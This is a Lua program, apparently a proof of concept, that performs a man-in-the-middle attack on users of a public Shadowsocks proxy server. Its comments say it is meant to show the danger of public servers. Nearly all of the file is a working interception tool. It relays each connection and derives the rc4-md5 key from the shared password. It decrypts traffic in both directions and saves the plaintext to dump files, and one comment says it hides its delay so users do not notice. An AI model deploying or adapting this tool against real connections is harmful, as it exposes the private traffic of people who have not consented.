-- Add the PUBLIC shadowsocks server address here.
REMOTE_SERVER = { "127.0.0.1", 8388 }

-- Let your Shadowsocks client listen at here...
LISTEN_PORT = 8389

-- It's a PUBLIC server so its password must already be known by
-- everyone.
SS_PASSWORD = "clowclow"

--
--    An MIM attacking program to show you the danger of using
--    a public Shadowsocks server.
--    MIM: Man-in-middle, possibly a gateway or a firewall.
--
--    by zyxwvu <imzyxwvu@icloud.com>
--    (I put the file on github [PUBLIC] because I want to contact with
--     Shadowsocks's designer and make a friend with her if she is willing,
--     she didn't reply me on Twitter. Maybe she has to hide her. )
--
--    Though maybe you have known the danger, I still recommend
--    you to use Shadowsocks because it has many kinds of clients.
--    But now you should be aware NOT to use a PUBLIC server.
--

crypto = require "crypto" -- luacrypto (an openssl binding)
uv = require "xuv" -- github.com/imzyxwvu/lua-xuv

Shadowsocks = { }

function Shadowsocks.random_string(length)
	local buffer = {}
	for i = 1, length do buffer[i] = math.random(0, 255) end
	return schar(unpack(buffer))
end

function Shadowsocks.evp_bytestokey(password, key_len, iv_len)
	local key = string.format("%s-%d-%d", password, key_len, iv_len)
	local m, i = {}, 0
	while #(table.concat(m)) < key_len + iv_len do
		local data = password
		if i > 0 then data = m[i] .. password end
		m[#m + 1], i = crypto.digest("md5", data, true), i + 1
	end
	local ms = table.concat(m)
	local key = ms:sub(1, key_len)
	local iv = ms:sub(key_len + 1, iv_len)
	return key, iv
end

function Shadowsocks.rc4_md5(wtf, key, iv)
	local md5 = crypto.digest.new "md5"
	md5:update(key)
	md5:update(iv)
	return wtf.new("rc4", md5:final(nil, true), "")
end

function Shadowsocks.dumppy(iv, of_name)
	local of = assert(io.open(of_name, "wb"))
	local base_key = Shadowsocks.evp_bytestokey(SS_PASSWORD, 16, 16)
	local decipher = Shadowsocks.rc4_md5(crypto.decrypt, base_key, iv)
	return function(chunk)
		of:write(decipher:update(chunk))
		of:flush()
	end
end

-- Transparent Proxy Implement
uv.listen("127.0.0.1", LISTEN_PORT, 32, function(self)
	self:nodelay(true) -- let the user feel there is no man in middle
	local dumper_to_remote, dumper_to_local
	uv.connect(REMOTE_SERVER[1], REMOTE_SERVER[2] or 8388, function(remote, err)
		if err then
			print("error: cannot connect to the remote side due to " .. err)
			self:close()
			return
		end
		remote:nodelay(true)
		-- simply pass the close event
		function self.on_close() remote:close() end
		function remote.on_close() self:close() end
		-- tricks
		local function send_to_remote(chunk)
			self:read_stop()
			return remote:write(chunk, function()
				if self() then self:read_start() end
			end)
		end
		local function send_to_local(chunk)
			remote:read_stop()
			return self:write(chunk, function()
				if remote() then remote:read_start() end
			end)
		end
		-- handle data exchange
		function self.on_data(chunk)
			if dumper_to_remote then
				dumper_to_remote(chunk)
				send_to_remote(chunk)
			elseif #chunk >= 16 then
				dumper_to_remote = Shadowsocks.dumppy(
					chunk:sub(1, 16), os.time() .. "-tr.dump")
				if #chunk > 16 then
					dumper_to_remote(chunk:sub(17, -1))
					send_to_remote(chunk)
				end
			else self:close() end
		end
		function remote.on_data(chunk)
			if dumper_to_local  then
				dumper_to_local(chunk)
				send_to_local(chunk)
			elseif #chunk >= 16 then
				dumper_to_local = Shadowsocks.dumppy(
					chunk:sub(1, 16), os.time() .. "-tl.dump")
				if #chunk > 16 then
					dumper_to_local(chunk:sub(17, -1))
					send_to_local(chunk)
				end
			else remote:close() end
		end
		self:read_start()
		remote:read_start()
	end)
end)

uv.run()